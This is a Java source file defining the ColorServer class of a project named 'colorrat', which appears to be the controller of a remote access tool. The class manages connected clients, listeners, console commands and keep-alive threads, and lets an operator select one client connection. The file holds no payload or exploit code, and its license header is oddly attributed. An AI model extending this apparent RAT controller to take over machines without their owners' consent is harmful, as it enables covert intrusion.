package eu.aragonapp.colorrat;

import eu.aragonapp.colorrat.command.CommandManager;
import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.listener.Listener;
import eu.aragonapp.colorrat.network.thread.types.AcceptThread;
import eu.aragonapp.colorrat.network.thread.types.ConsoleThread;
import eu.aragonapp.colorrat.network.thread.types.KeepAliveThread;
import eu.aragonapp.colorrat.utils.$;
import eu.aragonapp.colorrat.utils.Logger;

import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.LogManager;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class ColorServer {

    private static ColorServer instance;
    private static Logger logger;

    private final ArrayList<NetworkConnection> clients;
    private final ArrayList<Listener> listeners;

    private final CommandManager commandManager;

    private final KeepAliveThread keepAliveThread;
    private final ConsoleThread consoleThread;

    private NetworkConnection selectedConnection;
    private boolean running;

    public ColorServer() {
        LogManager.getLogManager().reset();

        instance = this;

        this.listeners = new ArrayList<>();
        this.clients = new ArrayList<>();

        this.setRunning(true);
        this.commandManager = new CommandManager();

        this.consoleThread = new ConsoleThread();
        this.consoleThread.start();
        this.keepAliveThread = new KeepAliveThread();
        this.keepAliveThread.start();

        Runtime.getRuntime().addShutdownHook(new Thread(this::close));
    }

    public void close() {
        setRunning(false);

        for(NetworkConnection connection : this.clients)
            connection.getReceiveThread().close();

        for (Listener listener : this.listeners)
            listener.close();

        this.keepAliveThread.close();
        this.consoleThread.close();
    }

    public NetworkConnection getSelectedConnection() {
        return this.selectedConnection;
    }

    public void setSelectedConnection(NetworkConnection selectedConnection) {
        this.selectedConnection = selectedConnection;
    }

    public static void setLogger(Logger logger) {
        ColorServer.logger = logger;
    }

    public ArrayList<NetworkConnection> getClients() {
        return clients;
    }

    public CommandManager getCommandManager() {
        return commandManager;
    }

    public void setRunning(boolean running) {
        this.running = running;
    }

    public ArrayList<Listener> getListeners() {
        return listeners;
    }

    public static ColorServer getInstance() {
        return instance;
    }

    public static Logger getLogger() {
        return logger;
    }

    public boolean isRunning() {
        return running;
    }

}
